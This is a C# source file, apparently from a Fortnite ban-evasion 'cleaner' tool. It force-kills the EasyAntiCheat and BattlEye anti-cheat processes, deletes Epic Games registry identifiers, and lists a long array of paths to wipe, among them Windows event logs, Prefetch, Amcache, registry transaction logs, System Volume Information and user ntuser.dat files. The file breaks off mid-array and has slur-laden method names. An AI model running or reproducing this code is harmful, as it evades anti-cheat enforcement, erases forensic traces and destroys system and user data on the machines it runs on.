using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Management;
using System.Diagnostics;
using System.Threading;
using System.Net;
using Microsoft.Win32;
using System.Security.Principal;
using System.Windows.Forms;
using System.Runtime.CompilerServices;
using System.Drawing;
using System.Collections;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows;


namespace API_Example
{
    class Cleaners
    {
        private static string SIDCleaner = WindowsIdentity.GetCurrent().User.Value;

        public static void Cleantraces()
        {
            try
            {
                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Epic Games\\Unreal Engine\\Identifiers", true))
                {
                    if (registryKey != null)
                    {
                        registryKey.DeleteValue("AccountId");
                        registryKey.DeleteValue("MachineId");
                    }
                }
            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[!] Error reg not found.");
            }
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            process.StandardInput.WriteLine("taskkill /f /im UnrealCEFSubProcess.exe");
            process.StandardInput.WriteLine("taskkill /f /im CEFProcess.exe");
            process.StandardInput.WriteLine("taskkill /f /im EasyAntiCheat.exe");
            process.StandardInput.WriteLine("taskkill /f /im BEService.exe");
            process.StandardInput.WriteLine("taskkill /f /im BEServices.exe");
            process.StandardInput.WriteLine("taskkill /f /im BattleEye.exe");
            process.StandardInput.WriteLine("taskkill /f /im epicgameslauncher.exe");
            process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe");
            process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping.exe");
            process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe");
            process.StandardInput.WriteLine("taskkill /f /im FortniteLauncher.exe");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\EpicGames\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CLASSES_ROOT\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Hardware Survey\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Identifiers\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\EpicGames\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\EpicGames\" /f");
            process.StandardInput.WriteLine("reg delete \"HKEY_USERS\\" + SIDCleaner + "\\Software\\Epic Games\" /f");
            process.StandardInput.WriteLine(@"del C:\Users\%Username%\AppData\Local\FortniteGame\Saved\Logs\FortniteGame.log /f");
            process.StandardInput.WriteLine(@"del C:\Users\Username%\AppData\Local\FortniteGame\Saved\Config\WindowsClient\GameUserSettings.ini /f");
            process.StandardInput.WriteLine(@"del C:\Program Files\Epic Games\Fortnite\FortniteGame\PersistentDownloadDir\CMS\CacheAccess.json /f");
            process.StandardInput.WriteLine(@"del C:\Program Files\Epic Games\Fortnite\FortniteGame\PersistentDownloadDir /f");
            process.StandardInput.WriteLine(@"del C:\Program Files\Epic Games\Fortnite\FortniteGame\PersistentDownloadDir\CMS /f");
            process.StandardInput.WriteLine(@"del C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations /f");
            process.StandardInput.WriteLine(@"del C:\Users\%Username%\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\DeviceSearchCache /f");

            process.StandardInput.WriteLine("exit");
            Cleaners.ModifyRegistry();
            Cleaners.FeggotCleaner();
            Cleaners.Fuck12();
            //Cleaners.ModifyRegistry();
            //Cleaners.FileCleaner();
            // ass protecc
        }
        public static string user = Environment.UserName;
        #region minimise oldcleaner
        //fixing overhax cleaner
        public static string[] GetFiles = new string[]
        {


            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher",
            "C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache",
            "C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\Rules",
            "C:\\Windows\\System32\\sru",
            "C:\\Users\\Public\\desktop.ini",
            "C:\\Windows\\Logs\\WindowsUpdate",
            "C:\\Windows\\WindowsUpdate.log",
            "C:\\Windows\\SoftwareDistribution\\DataStore",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\FontCache",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Speech Graphics\\Carnival",
            "C:\\ProgramData\\USOPrivate\\UpdateStore",
            "C:\\ProgramData\\USOShared\\Logs",
            "C:\\Windows\\System32\\config\\DEFAULT.LOG1",
            "C:\\Windows\\System32\\config\\BBI.LOG2",
            "C:\\Windows\\System32\\SleepStudy",
            "C:\\Windows\\System32\\LogFiles\\WMI\\RtBackup",
            "C:\\Windows\\System32\\spp\\store\\2.0\\cache\\cache.dat",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask",
            "C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA",
            "C:\\Windows\\System32\\wbem\\Repository\\INDEX.BTR",
            "C:\\Windows\\System32\\wbem\\Repository\\MAPPING3.MAP",
            "C:\\Windows\\System32\\winevt\\Logs",
            "C:\\Windows\\System32\\LogFiles\\WMI\\Wifi.etl",
            "C:\\Windows\\INF\\netrasa.PNF",
            "C:\\Recovery\\ntuser.sys",
            "C:\\MSOCache{71230000-00E2-0000-1000-00000000}\\Setup.dat",
            "C:\\Users\\Public\\Libraries\\collection.dat",
            "C:\\Windows\\1234.exe",
            "C:\\Windows\\System32\\spp\\store\\2.0\\cache\\cache.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher",
            "C:\\Users\\"+ user +"\\AppData\\Local\\FortniteGame",
            "C:\\Users\\"+ user +"\\AppData\\Local\\UnrealEngine",
            "C:\\Users\\"+ user +"\\AppData\\Local\\UnrealEngineLauncher",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\AMD",
            "C:\\Temp",
            "C:\\Windows\\Prefetch",
            "C:\\Shared Files",
            "C:\\Recovery\\ntuser.sys",
            "C:\\Users\\"+ user +"\\ntuser.dat",
            "C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Feeds",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Temp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\ActionCenterCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Notifications",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Speech Graphics",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve",
            "C:\\$RECYCLE.BIN",
            "C:\\Intel",
            "D:\\Recovery\\ntuser.sys",
            "D:\\MSOCache\\{71230000-00E2-0000-1000-00000000}\\Setup.dat",
            "D:\\desktop.ini:CachedTiles",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher",
            "C:\\Users\\"+ user +"\\AppData\\Local\\UnrealEngine",
            "C:\\Users\\"+ user +"\\AppData\\Local\\CEF",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Comms",
            "C:\\Users\\"+ user +"\\AppData\\Local\\ConnectedDevicesPlatform",
            "C:\\Users\\"+ user +"\\AppData\\Local\\BattlEye",
            "C:\\Users\\"+ user +"\\AppData\\Local\\CrashDumps",
            "C:\\Users\\"+ user +"\\AppData\\Local\\CrashReportClient",
            "C:\\Users\\"+ user +"\\AppData\\Local\\D3DSCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\DBG",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Programs\\Common",
            "C:\\Users\\"+ user +"\\AppData\\Local\\PlaceholderTileLogoFolder",
            "C:\\Users\\"+ user +"\\AppData\\Local\\VirtualStore",
            "C:\\Users\\Public",
            "C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS",
            "C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\DMS",
            "C:\\Program Files\\rempl\\Logs",
            "C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache",
            "C:\\ProgramData\\Microsoft\\Diagnosis",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\ProgramData\\Microsoft\\Windows\\AppRepository",
            "C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp",
            "C:\\ProgramData\\USOShared\\Logs",
            "C:\\ProgramData\\USOPrivate\\UpdateStore",
            "C:\\Shared Files",
            "C:\\Recovery\\ntuser.sys",
            "C:\\System Volume Information",
            "C:\\Users\\"+ user +"\\AppData\\Local\\AMD\\DxCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOG2",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation\\GfeSDK",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\slideshow.ini",
            "C:\\Users\\"+ user +"\\ntuser.dat.LOG1",
            "C:\\Users\\"+ user +"\\ntuser.dat.LOG2",
            "C:\\Users\\"+ user +"\\ntuser.ini",
            "C:\\Users\\Public\\Libraries",
            "C:\\Users\\Public\\desktop.ini",
            "C:\\Windows\\DeliveryOptimization",
            "C:\\Windows\\Logs\\WindowsUpdate",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Temp",
            "C:\\Windows\\SoftwareDistribution\\DataStore\\Logs",
            "C:\\Windows\\System32\\LogFiles\\WMI\\RtBackup",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start",
            "C:\\Windows\\System32\\spp\\store\\2.0\\cache\\cache.dat",
            "C:\\Windows\\System32\\winevt\\Logs",
            "C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\LMS\\Manifest.sav",
            "C:\\Windows\\System32\\drivers\\storage.cache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Publishers",
            "C:\\Users\\"+ user +"\\AppData\\Local\\UnrealEngineLauncher",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation\\GfeSDK\\FortniteClient-Win64-Shipping_8060.log",
            "C:\\Windows\\SoftwareDistribution\\ReportingEvents.log",
            "C:\\Windows\\System32\\LogFiles\\WMI\\RtBackup\\EtwRTGraphicsPerfMonitorSession.etl",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE",
            "C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS",
            "C:\\Windows\\INF\\netrasa.PNF",
            "C:\\MSOCache{71230000-00E2-0000-1000-00000000}\\Setup.dat",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\AMD",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\Notifications",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\FontCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting",
            "C:\\Windows\\System32\\sru",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles",
            "C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOG2",
            "C:\\Windows\\System32\\SleepStudy",
            "C:\\Windows\\System32\\LogFiles\\WMI\\RtBackup",
            "C:\\Windows\\System32\\spp\\store\\2.0\\cache\\cache.dat",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask",
            "C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA",
            "C:\\Windows\\System32\\wbem\\Repository\\INDEX.BTR",
            "C:\\Windows\\System32\\wbem\\Repository\\MAPPING3.MAP",
            "C:\\Windows\\System32\\PerfStringBackup.TMP",
            "C:\\Windows\\System32\\PerfStringBackup.INI",
            "C:\\Windows\\System32\\perfc009.dat",
            "C:\\Windows\\System32\\perfh009.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\OneDrive\\settings",
            "C:\\Windows\\SoftwareDistribution\\ReportingEvents.log",
            "C:\\Windows\\SoftwareDistribution\\DataStore",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\Program Files x86\\Common Files\\BattlEye\\BEDaisy.sys",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\Engine.ini",
            "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\XboxLive",
            "C:\\Windows\\System32\\drivers\\storage.cache",
            "C:\\PerfLogs\\collections.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\FortniteGame\\Saved\\Config\\CrashReportClient",
            "C:\\Users\\"+ user +"\\AppData\\Local\\IconCache.db",
            "C:\\Users\\"+ user +"\\AppData\\Local\\updater.log",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\AppCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\AppCache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\container.dat",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Origin",
            "C:\\Program Files\\rempl\\Logs",
            "C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache",
            "C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp",
            "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive",
            "C:\\ProgramData\\Origin\\Logs",
            "C:\\ProgramData\\USOPrivate\\UpdateStore",
            "C:\\ProgramData\\USOShared\\Logs",
            "C:\\Recovery\\ntuser.sys",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCache",
            "C:\\Windows\\System32\\config\\DEFAULT.LOG1",
            "C:\\Windows\\System32\\config\\SYSTEM.LOG2",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start",
            "C:\\Windows\\System32\\spp\\store\\2.0\\cache\\cache.dat",
            "C:\\Windows\\System32\\sru",
            "C:\\Windows\\System32\\winevt\\Logs",
            "C:\\Windows\\WinSxS\\ManifestCache",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve.LOG2",
            "C:\\Windows\\appcompat\\appraiser\\AltData",
            "C:\\Recovery",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Feeds Cache",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Temp",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache\\V01.chk",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve",
            "C:\\desktop.ini:CachedTiles",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Local Settings\\Temporary Internet Files",
            "C:\\MSOCache{71230000-00E2-0000-1000-00000000}\\Setup.dat",
            "C:\\Program Files x86\\TeamViewer\\Connections_incoming.txt",
            "C:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\ProgramData\\USOPrivate\\UpdateStore",
            "C:\\ProgramData\\USOShared\\Logs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation\\GfeSDK\\FortniteClient-Win64-Shipping_8060.log",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles",
            "C:\\Users\\"+ user +"\\ntuser.dat.LOG1",
            "C:\\Users\\"+ user +"\\ntuser.dat.LOG2",
            "C:\\Windows\\1234.exe",
            "C:\\Windows\\INF\\netrasa.PNF",
            "C:\\Windows\\Prefetch",
            "C:\\Windows\\SoftwareDistribution\\DataStore",
            "C:\\Windows\\SoftwareDistribution\\ReportingEvents.log",
            "C:\\Windows\\System32\\LogFiles\\WMI\\RtBackup",
            "C:\\Windows\\System32\\LogFiles\\WMI\\Wifi.etl",
            "C:\\Windows\\System32\\SMI\\Store\\Machine\\SCHEMA.DAT{1c3790dc-b8ad-11e8-aa21-e41d2d101530}.TxR.2.regtrans-ms",
            "C:\\Windows\\System32\\SMI\\Store\\Machine\\SCHEMA.DAT{1c3790dc-b8ad-11e8-aa21-e41d2d101530}.TxR.blf",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask",
            "C:\\Windows\\System32\\config\\BBI.LOG2",
            "C:\\Windows\\System32\\config\\COMPONENTS{1c379064-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms",
            "C:\\Windows\\System32\\config\\COMPONENTS{1c379064-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms",
            "C:\\Windows\\System32\\config\\SYSTEM.LOG2",
            "C:\\Windows\\System32\\drivers\\etc\\protocol",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve.LOG2",
            "C:\\desktop.ini:CachedTiles",
            "C:\\Users\\"+ user +"\\AppData\\Local\\FortniteGame\\Saved\\Config",
            "C:\\Windows\\INF\\WmiApRpl",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Logs",
            "C:\\ProgramData\\NVIDIA Corporation\\NV_Cache\\92e0b06784280dec34f87311d172295b_fce8395c8fd8a98b_be4cb461d6f8ddbc_0_6__1.bin",
            "C:\\Users\\"+ user +"\\AppData\\Local\\FortniteGame\\Saved\\Demos",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE",
            "C:\\Windows\\System32\\sru",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\VSApplicationInsights",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOG2",
            "C:\\Users\\"+ user +"\\ntuser.dat.LOG2",
            "C:\\Users\\"+ user +"\\ntuser.dat.LOG1",
            "C:\\Windows\\System32\\config\\DEFAULT.LOG2",
            "C:\\Windows\\System32\\config\\SYSTEM.LOG1",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings\\telemetry.A-MSTelDefault.json.new",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings\\telemetry.A-MSTelDefault.json",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedScenarios\\WINDOWS.SIUF.xml",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedScenarios\\WINDOWS.SIUF.xml.new",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\Windows\\System32\\config\\DEFAULT.LOG1",
            "C:\\Windows\\System32\\config\\BBI.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation\\GfeSDK\\FortniteClient-Win64-Shipping_5880.log",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation\\GfeSDK",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache",
            "C:\\ProgramData\\NVIDIA Corporation\\Drs",
            "C:\\Windows\\System32\\wbem\\Repository\\MAPPING2.MAP",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini",
            "C:\\Users\\"+ user +"\\AppData\\Local\\UnrealEngineLauncher",
            "C:\\ProgramData\\NVIDIA",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT.LOG1",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT.LOG2",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp",
            "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\WebCache",
            "C:\\Users\\"+ user +"\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache",
            "",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings",
            "C:\\ProgramData\\USOPrivate\\UpdateStore",
            "C:\\ProgramData\\USOShared\\Logs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation\\GfeSDK\\FortniteClient-Win64-Shipping_8060.log",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles",
            "C:\\Users\\"+ user +"\\ntuser.dat.LOG1",
            "C:\\Users\\"+ user +"\\ntuser.dat.LOG2",
            "C:\\Windows\\1234.exe",
            "C:\\Windows\\INF\\netrasa.PNF",
            "C:\\Windows\\Prefetch",
            "C:\\Windows\\SoftwareDistribution\\DataStore",
            "C:\\Windows\\SoftwareDistribution\\ReportingEvents.log",
            "C:\\Windows\\System32\\LogFiles\\WMI\\RtBackup",
            "C:\\Windows\\System32\\LogFiles\\WMI\\Wifi.etl",
            "C:\\Windows\\System32\\SMI\\Store\\Machine\\SCHEMA.DAT{1c3790dc-b8ad-11e8-aa21-e41d2d101530}.TxR.2.regtrans-ms",
            "C:\\Windows\\System32\\SMI\\Store\\Machine\\SCHEMA.DAT{1c3790dc-b8ad-11e8-aa21-e41d2d101530}.TxR.blf",
            "C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SoftwareProtectionPlatform\\SvcRestartTask",
            "C:\\Windows\\System32\\config\\BBI.LOG2",
            "C:\\Windows\\System32\\config\\COMPONENTS{1c379064-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms",
            "C:\\Windows\\System32\\config\\COMPONENTS{1c379064-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms",
            "C:\\Windows\\System32\\config\\SYSTEM.LOG2",
            "C:\\Windows\\System32\\drivers\\etc\\protocol",
            "C:\\Windows\\appcompat\\Programs\\Amcache.hve.LOG2",
            "C:\\desktop.ini:CachedTiles",
            "C:\\Users\\"+ user +"\\AppData\\Local\\FortniteGame\\Saved\\Config",
            "C:\\Windows\\INF\\WmiApRpl",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\AC\\INetCache",
            "C:\\Users\\"+ user +"\\AppData\\Roaming\\Logs",
            "C:\\ProgramData\\NVIDIA Corporation\\NV_Cache\\92e0b06784280dec34f87311d172295b_fce8395c8fd8a98b_be4cb461d6f8ddbc_0_6__1.bin",
            "C:\\Users\\"+ user +"\\AppData\\Local\\FortniteGame\\Saved\\Demos",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE",
            "C:\\Windows\\System32\\sru",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\VSApplicationInsights",
            "C:\\Users\\"+ user +"\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.LOG2",
            "C:\\Users\\"+ user +"\\ntuser.dat.LOG2",
            "C:\\Users\\"+ user +"\\ntuser.dat.LOG1",
            "C:\\Windows\\System32\\config\\DEFAULT.LOG2",
            "C:\\Windows\\System32\\config\\SYSTEM.LOG1",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\EventStore.db-wal",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings\\telemetry.A-MSTelDefault.json.new",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedSettings\\telemetry.A-MSTelDefault.json",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedScenarios\\WINDOWS.SIUF.xml",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\DownloadedScenarios\\WINDOWS.SIUF.xml.new",
            "C:\\ProgramData\\Microsoft\\Diagnosis\\parse.dat",
            "C:\\Windows\\System32\\config\\DEFAULT.LOG1",
            "C:\\Windows\\System32\\config\\BBI.LOG1",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation\\GfeSDK\\FortniteClient-Win64-Shipping_5880.log",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation",
            "C:\\Users\\"+ user +"\\AppData\\Local\\NVIDIA Corporation\\GfeSDK",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache",
            "C:\\ProgramData\\NVIDIA Corporation\\Drs",
            "C:\\Windows\\System32\\wbem\\Repository\\MAPPING2.MAP",
            "C:\\Users\\"+ user +"\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini",
            "C:\\Users\\"+ user +"\\AppData\\Local\\UnrealEngineLauncher",
            "C:\\ProgramData\\NVIDIA",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT.LOG1",
            "C:\\Windows\\ServiceProfiles\\NetworkService\\NTUSER.DAT.LOG2",
